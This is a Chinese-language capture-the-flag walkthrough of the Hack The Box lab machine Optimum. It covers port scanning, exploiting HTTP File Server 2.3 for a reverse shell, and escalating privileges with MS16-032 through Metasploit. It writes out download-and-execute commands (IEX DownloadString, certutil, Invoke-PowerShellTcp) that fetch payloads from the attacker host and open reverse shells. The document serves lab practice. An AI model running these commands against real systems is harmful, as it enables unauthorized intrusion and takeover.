kali 10.10.16.5

靶机 10.10.10.8



```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



<img src=".\图片\Snipaste_2023-09-09_12-25-32.png" alt="Snipaste_2023-09-09_12-25-32" style="zoom:80%;" />



```bash
└─# nikto -host 10.10.10.8                   
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.8
+ Target Hostname:    10.10.10.8
+ Target Port:        80
+ Start Time:         2023-09-09 00:26:10 (GMT-4)
---------------------------------------------------------------------------
+ Server: HFS 2.3
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie HFS_SID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
^C                                     
```



```bash
─# searchsploit HFS 2.3
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                     | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                     | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                          | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                  | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                             | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                             | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                        | windows/webapps/34852.txt
```



修改 exp 参数，kali 监听

```bash
└─# python 49584.py
```

```bash
└─# nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.8] 49164

PS C:\Users\kostas\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```



```powershell
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          15/9/2023, 4:12:32 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.438 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.848 MB
Virtual Memory: In Use:    655 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```





提权，漏洞枚举，漏洞利用

[PEASS-ng/winPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

https://github.com/rasta-mouse/Sherlock

```bash
└─# echo 'Find-AllVulns' >> Sherlock.ps1 
```

```
IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.5/Sherlock.ps1')
```

```powershell
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.5/Sherlock.ps1')


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```



[HTB: Optimum | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)

[Hack The Box - Optimum Walkthrough - StefLan's Security Blog (steflan-security.com)](https://steflan-security.com/hack-the-box-optimum-walkthrough/)

[HackTheBox — Optimum — Walkthrough | by barpoet | Medium](https://medium.com/@barpoet/hackthebox-optimum-walkthrough-2a5824c77a15)

[HackTheBox | Optimum (benheater.com)](https://benheater.com/hackthebox-optimum/)



```http
https://www.exploit-db.com/exploits/41020
```

```
certutil -urlcache -split -f http://10.10.16.5/41020.exe 41020.exe
```

```powershell
PS C:\Users\kostas\Desktop> certutil -urlcache -split -f http://10.10.16.5/41020.exe 41020.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.
PS C:\Users\kostas\Desktop> .\41020.exe
```

卡住了，失败



尝试另一个，靶机导入

[Modified-MS16-032.ps1 · GitHub](https://gist.github.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980)

```
(New-Object Net.WebClient).DownloadString('http://10.10.16.5/Invoke-MS16032.ps1') | Invoke-Expression
```

kali 监听

```
nc -lnvp 1234
```

靶机触发

```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.5/Invoke-PowerShellTcp.ps1')"
```

失败



或者另一个 exp

下载

```
(new-object System.Net.WebClient).DownloadFile('http://10.10.16.5/bfill.exe', 'c:\Users\Public\Downloads\bfill.exe)'
```

触发

```
.\bfill.exe
```

失败



以下根据 writeup 用 msf 打



打点：

```absh
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
rhosts => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.16.5
lhost => 10.10.16.5
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Using URL: http://10.10.16.5:8080/CmJmmiDQ9MX
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /CmJmmiDQ9MX
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.8:49162) at 2023-09-09 22:51:40 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\MjTzXOzWB.vbs' on the target

meterpreter > 
```



进程迁移到 x64

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name        Arch  Session  User            Path
 ---   ----  ----        ----  -------  ----            ----
 0     0     [System Pr
             ocess]
 4     0     System
 232   4     smss.exe
 240   1788  GlleeYMBLa  x86   1        OPTIMUM\kostas  C:\Users\kostas\App
             pxH.exe                                    Data\Local\Temp\rad
                                                        9339C.tmp\GlleeYMBL
                                                        apxH.exe
 336   328   csrss.exe
 392   328   wininit.ex
             e
 400   384   csrss.exe
 444   384   winlogon.e
             xe
 480   484   spoolsv.ex
             e
 484   392   services.e
             xe
 492   392   lsass.exe
 556   484   svchost.ex
             e
 584   484   svchost.ex
             e
 672   444   dwm.exe
 680   484   svchost.ex
             e
 716   484   svchost.ex
             e
 784   484   svchost.ex
             e
 796   856   conhost.ex  x64   1        OPTIMUM\kostas  C:\Windows\System32
             e                                          \conhost.exe
 832   484   svchost.ex
             e
 844   484   svchost.ex
             e
 856   240   cmd.exe     x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64
                                                        \cmd.exe
 964   484   svchost.ex
             e
 976   484   vmtoolsd.e
             xe
 1008  484   VGAuthServ
             ice.exe
 1040  484   Management
             AgentHost.
             exe
 1204  484   svchost.ex
             e
 1460  484   dllhost.ex
             e
 1496  556   WmiPrvSE.e
             xe
 1544  484   msdtc.exe
 1640  556   WmiPrvSE.e
             xe
 1788  2748  wscript.ex  x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64
             e                                          \wscript.exe
 1904  716   taskhostex  x64   1        OPTIMUM\kostas  C:\Windows\System32
             .exe                                       \taskhostex.exe
 1956  1232  explorer.e  x64   1        OPTIMUM\kostas  C:\Windows\explorer
             xe                                         .exe
 1976  484   vds.exe
 2720  1956  vmtoolsd.e  x64   1        OPTIMUM\kostas  C:\Program Files\VM
             xe                                         ware\VMware Tools\v
                                                        mtoolsd.exe
 2748  1956  hfs.exe     x86   1        OPTIMUM\kostas  C:\Users\kostas\Des
                                                        ktop\hfs.exe
 2900  484   WmiApSrv.e
             xe

meterpreter > migrate 1956
```



提权

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.16.5
lhost => 10.10.16.5
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
```
